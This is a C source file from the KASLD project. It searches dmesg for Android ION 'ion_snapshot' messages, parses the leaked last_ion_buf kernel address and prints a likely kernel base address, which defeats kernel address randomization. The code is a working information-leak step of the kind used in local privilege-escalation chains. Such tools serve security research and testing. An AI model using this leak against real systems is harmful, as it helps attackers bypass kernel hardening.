// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Search kernel log for Android ION ion_snapshot map message which
// prints last_ion_buf symbol address:
//
//   ion_snapshot: 0x7e9d0000 map to 0xe0907000 and copy to 0xc0e5d374
//
// Android ION drivers were removed in kernel v5.11-rc1.
//
// Requires:
// - kernel.dmesg_restrict = 0; or CAP_SYSLOG capabilities; or
//   readable /var/log/dmesg.
//
// References:
// https://lwn.net/Articles/576966/
// https://lwn.net/Articles/565469/
// https://lwn.net/Articles/480055/
// https://elixir.bootlin.com/linux/v5.10.89/source/drivers/staging/android/ion
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include "include/dmesg.h"
#include "include/kasld.h"
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

static int on_match(const char *line, void *ctx) {
  unsigned long *result = ctx;
  const char *needle2 = "and copy to 0x";

  /* ion_snapshot: 0x7e9d0000 map to 0xe0907000 and copy to 0xc0e5d374 */
  const char *p = strstr(line, needle2);
  if (!p)
    return 1;

  char *endptr;
  unsigned long addr = strtoul(p + strlen(needle2), &endptr, 16);

  if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX) {
    *result = addr;
    return 0;
  }
  return 1;
}

int main(void) {
  unsigned long addr = 0;

  printf("[.] searching dmesg for 'ion_snapshot: ' ...\n");
  dmesg_search("ion_snapshot: ", on_match, &addr);

  if (!addr)
    return 1;

  printf("leaked last_ion_buf: %lx\n", addr);
  printf("possible kernel base: %lx\n", addr & -KERNEL_ALIGN);
  kasld_result(KASLD_ADDR_VIRT, KASLD_SECTION_TEXT, addr,
               "dmesg_android_ion_snapshot");

  return 0;
}
